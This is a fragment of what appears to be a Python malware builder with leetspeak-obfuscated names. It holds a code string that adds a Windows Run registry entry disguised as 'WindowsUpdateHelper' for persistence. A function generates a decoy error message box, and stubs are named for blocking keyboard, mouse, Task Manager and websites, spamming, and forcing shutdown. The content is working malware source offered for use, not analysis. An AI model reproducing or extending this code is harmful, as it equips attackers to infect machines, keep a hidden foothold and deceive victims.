# ─────────────────────────────────────────────────────────────────────────────
St4rtup = r"""
try:
    import winreg as _v4r_st_wr, sys as _v4r_st_sys, os as _v4r_st_os
    def _v4r_startup():
        _exe = _v4r_st_sys.executable
        _key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            hk = _v4r_st_wr.OpenKey(_v4r_st_wr.HKEY_CURRENT_USER, _key, 0, _v4r_st_wr.KEY_SET_VALUE)
            _v4r_st_wr.SetValueEx(hk, "WindowsUpdateHelper", 0, _v4r_st_wr.REG_SZ, f'"{_exe}"')
            _v4r_st_wr.CloseKey(hk)
        except Exception: pass
    _v4r_startup()
except Exception: pass
"""

# ─────────────────────────────────────────────────────────────────────────────
#  FAKE ERROR  — function returning the code string
# ─────────────────────────────────────────────────────────────────────────────
def F4k33rr0r(title: str, message: str) -> str:
    if not title.strip() or not message.strip():
        return ""
    safe_title   = title.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
    safe_message = message.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
    return (
        "\ntry:\n"
        "    import ctypes as _v4r_fe\n"
        f'    _v4r_fe.windll.user32.MessageBoxW(0, "{safe_message}", "{safe_title}", 0x10)\n'
        "except Exception: pass\n"
    )

# ─────────────────────────────────────────────────────────────────────────────
#  DISABLED STUBS  — all options disabled in the preset
# ─────────────────────────────────────────────────────────────────────────────
B10ckK3y         = ""
B10ckM0u53       = ""
B10ckT45kM4n4g3r = ""
B10ckW3b5it3     = ""
Sp4m0p3nPr0gr4m  = ""
Sp4mCr34tFil3    = ""
Sp4mOpti0ns      = ""
Shutd0wn         = ""
R3st4rt          = ""
